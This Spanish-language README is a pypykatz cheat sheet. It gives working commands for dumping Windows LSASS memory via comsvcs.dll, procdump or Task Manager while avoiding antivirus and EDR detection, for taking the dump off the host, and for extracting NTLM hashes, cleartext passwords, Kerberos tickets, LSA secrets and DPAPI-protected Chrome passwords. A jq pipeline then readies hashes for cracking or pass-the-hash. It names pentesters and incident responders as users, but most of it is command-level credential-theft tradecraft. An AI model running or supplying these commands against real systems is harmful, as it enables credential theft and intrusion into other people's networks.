<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de referencia de pypykatz

[pypykatz](https://github.com/skelsec/pypykatz) es una implementación pura de Python de [Mimikatz](https://github.com/gentilkiwi/mimikatz). Permite a los evaluadores de penetración y a los respondedores de incidentes analizar volcados de memoria LSASS de Windows, subárboles de registro SAM/SYSTEM/SECURITY, claves DPAPI y tickets de Kerberos completamente fuera de línea en Linux y macOS sin activar Windows Defender, agentes de detección y respuesta de puntos finales (EDR) ni necesidad de acceso en vivo al host de Windows.

---

## Tabla de contenidos

- [Descripción general y seguridad operativa (OpSec)](#overview--operative-security-opsec)
- [Instalación](#instalación)
- [Análisis de volcado LSASS sin conexión (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [Extracción de colmena SAM y SISTEMA (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [Extracción de secretos LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Claves maestras DPAPI y análisis de credenciales] (#dpapi-master-keys--credential-parsing)
- [Exportación JSON y canalizaciones de credenciales automatizadas](#json-export--canalizaciones-de-credenciales-automatizadas)
- [Técnicas para volcar LSASS de forma segura en Windows](#técnicas-para-volcar-lsass-en-windows de forma segura)

---

## Descripción general y seguridad operativa (OpSec)

La ejecución del `mimikatz.exe` estándar en una máquina Windows de destino activa con frecuencia sensores de comportamiento y firmas estáticas. `pypykatz` separa la fase de volcado de la fase de análisis:
1. Vuelque la memoria del proceso LSASS utilizando herramientas nativas o LOLBAS (Administrador de tareas, `procdump`, `rundll32.exe` o `comsvcs.dll`).
2. Exfiltre el archivo `.dmp` a su sistema de análisis Linux.
3. Analice las credenciales completamente fuera de línea con `pypykatz` sin riesgo AV.

---

## Instalación
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Análisis de volcado de LSASS sin conexión (`lsa minidump`)

Analice los volcados de memoria generados desde `lsass.exe` para recuperar contraseñas de texto sin cifrar, hashes NTLM, hashes SHA1, tickets Kerberos (TGT/TGS) y claves de cifrado AES:

### 1. Análisis básico de minivolcado
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
El resultado extrae credenciales particionadas por proveedores de seguridad:
- **msv1_0:** Nombres de usuario, dominios, hashes NTLM y hashes LM.
- **wdigest:** Contraseñas de texto sin cifrar (si el almacenamiento en caché de WDigest está habilitado).
- **kerberos:** Sesiones de tickets de Kerberos y claves AES.
- **ssp:** Credenciales del proveedor de soporte de seguridad.
- **livessp:** Credenciales de la cuenta de Microsoft.
- **cloudap:** Tokens de actualización primarios (PRT) de Azure AD y claves de sesión.

### 2. Analizar varios volcados de memoria de forma recursiva
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## Extracción de colmena SAM y SISTEMA (`registry sam`)

Extraiga los nombres de usuario de las cuentas locales, los RID y los hashes de contraseñas NTLM de las copias del subárbol del registro de Windows sin conexión:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Producción:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Extracción de secretos de LSA (`registry security`)

Recupere secretos de LSA, contraseñas de cuentas de máquina, contraseñas de dominio predeterminadas y claves de texto sin cifrar de cuentas de servicio de las colmenas `SECURITY` y `SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Los secretos extraídos incluyen:
- `_SC_DefaultPassword`: Credenciales de inicio de sesión automático.
- `$MACHINE.ACC`: Hashes NTLM de la cuenta del equipo del dominio.
- Credenciales de dominio en caché (DCC2/mscache2).

---

## Claves maestras y análisis de credenciales de DPAPI

La API de protección de datos (DPAPI) cifra las contraseñas de Chrome, las claves de Wi-Fi y las credenciales RDP:

### 1. Extraiga las claves maestras DPAPI del Registro y el SISTEMA
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Descifrar las contraseñas almacenadas en Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## Exportación JSON y canales de credenciales automatizados

Exporte las credenciales analizadas directamente a JSON para su ingesta inmediata en Hashcat, BloodHound o CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Extraiga hashes NTLM limpios utilizando `jq` para descifrar o pasar el hash de forma inmediata:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Técnicas para volcar LSASS de forma segura en Windows

Para alimentar memoria en `pypykatz`, cree un minivolcado LSASS en el host de destino utilizando componentes nativos:

### 1. LOLBAS nativo a través de `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. GUI del Administrador de tareas
1. Abra el Administrador de tareas como administrador.
2. En **Detalles**, haga clic derecho en `lsass.exe`.
3. Haga clic en **Crear archivo de volcado** (guardado en `%TEMP%\lsass.DMP`).

### 3. Componentes internos del sistema `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Una vez descargado en su máquina Linux, ejecute `pypykatz lsa minidump lsass.dmp`.*